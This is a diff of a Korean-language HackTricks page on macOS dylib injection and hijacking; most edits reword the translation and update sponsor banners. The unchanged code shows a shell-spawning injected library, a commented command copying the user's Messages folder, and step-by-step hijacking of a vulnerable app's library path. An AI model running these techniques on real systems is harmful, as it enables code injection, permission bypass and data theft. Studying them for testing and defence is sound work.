@@ -1,22 +1,23 @@
 # macOS Dyld Hijacking & DYLD\_INSERT\_LIBRARIES
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**telegram 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
-* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## DYLD\_INSERT\_LIBRARIES 기본 예제
 
-**쉘을 실행하기 위해 주입할 라이브러리**:
+**쉘을 실행하기 위해 주입할 라이브러리:**
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -34,7 +35,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-공격할 이진 파일:
+공격할 바이너리:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -45,13 +46,13 @@ printf("Hello, World!\n");
 return 0;
 }
 ```
-삽입 (Injection):
+주입:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Dyld Hijacking 예제
+## Dyld Hijacking Example
 
-대상 취약한 이진 파일은 `/Applications/VulnDyld.app/Contents/Resources/lib/binary`입니다.
+타겟 취약 바이너리는 `/Applications/VulnDyld.app/Contents/Resources/lib/binary`입니다.
 
 {% tabs %}
 {% tab title="entitlements" %}
@@ -87,17 +88,16 @@ current version 1.0.0
 compatibility version 1.0.0
 # Check the versions
 ```
-{% code %}
 {% endcode %}
 {% endtab %}
 {% endtabs %}
 
-이전 정보를 통해 우리는 **로드된 라이브러리의 서명을 확인하지 않고** 다음 경로에서 라이브러리를 로드하려고 시도한다는 것을 알 수 있습니다:
+이전 정보를 통해 우리는 **로드된 라이브러리의 서명을 확인하지 않고** 있으며 **다음 위치에서 라이브러리를 로드하려고 시도하고 있다는 것을 알 수 있습니다**:
 
 * `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 * `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
-그러나 첫 번째 경로는 존재하지 않습니다:
+하지만 첫 번째는 존재하지 않습니다:
 ```bash
 pwd
 /Applications/VulnDyld.app
@@ -105,7 +105,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-그래, 그것을 탈취할 수 있어! 합법적인 라이브러리와 동일한 기능을 내보내며 임의의 코드를 실행하는 라이브러리를 생성하세요. 그리고 예상 버전과 함께 컴파일하는 것을 기억하세요:
+그래서, 그것을 탈취하는 것이 가능합니다! **임의의 코드를 실행하고 정품 라이브러리와 동일한 기능을 재수출하여** 라이브러리를 만드세요. 그리고 예상되는 버전으로 컴파일하는 것을 잊지 마세요:
 
 {% code title="lib.m" %}
 ```objectivec
@@ -118,7 +118,7 @@ NSLog(@"[+] dylib hijacked in %s", argv[0]);
 ```
 {% endcode %}
 
-컴파일하십시오:
+컴파일하세요:
 
 {% code overflow="wrap" %}
 ```bash
@@ -127,7 +127,7 @@ gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Found
 ```
 {% endcode %}
 
-라이브러리에서 생성된 재내보내기 경로는 로더에 상대적이므로, 내보낼 라이브러리에 대한 절대 경로로 변경해보겠습니다:
+라이브러리에서 생성된 재수출 경로는 로더에 상대적입니다. 이를 라이브러리를 내보내기 위한 절대 경로로 변경합시다:
 
 {% code overflow="wrap" %}
 ```bash
@@ -148,7 +148,7 @@ name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Con
 ```
 {% endcode %}
 
-마지막으로 **해킹된 위치**에 복사하십시오:
+마지막으로 **탈취된 위치**에 복사합니다:
 
 {% code overflow="wrap" %}
 ```bash
@@ -156,7 +156,7 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
 {% endcode %}
 
-바이너리를 **실행**하고 **라이브러리가 로드되었는지** 확인하십시오:
+그리고 **이진 파일을 실행**하고 **라이브러리가 로드되었는지 확인**합니다:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
@@ -164,25 +164,26 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 </code></pre>
 
 {% hint style="info" %}
-텔레그램의 카메라 권한을 악용하기 위해 이 취약점을 악용하는 방법에 대한 좋은 설명은 [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)에서 찾을 수 있습니다.
+텔레그램의 카메라 권한을 악용하는 방법에 대한 좋은 글은 [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)에서 찾을 수 있습니다.
 {% endhint %}
 
 ## 더 큰 규모
 
-의도하지 않은 이진 파일에 라이브러리를 주입하려는 경우 이벤트 메시지를 확인하여 프로세스 내에서 라이브러리가 로드되는 시점을 찾을 수 있습니다 (이 경우 printf와 `/bin/bash` 실행을 제거하십시오).
+예상치 못한 이진 파일에 라이브러리를 주입하려는 경우, 프로세스 내에서 라이브러리가 로드될 때를 확인하기 위해 이벤트 메시지를 확인할 수 있습니다(이 경우 printf와 `/bin/bash` 실행을 제거하십시오).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>
+<summary>HackTricks 지원하기</summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
-* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.
+* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
+{% endhint %}
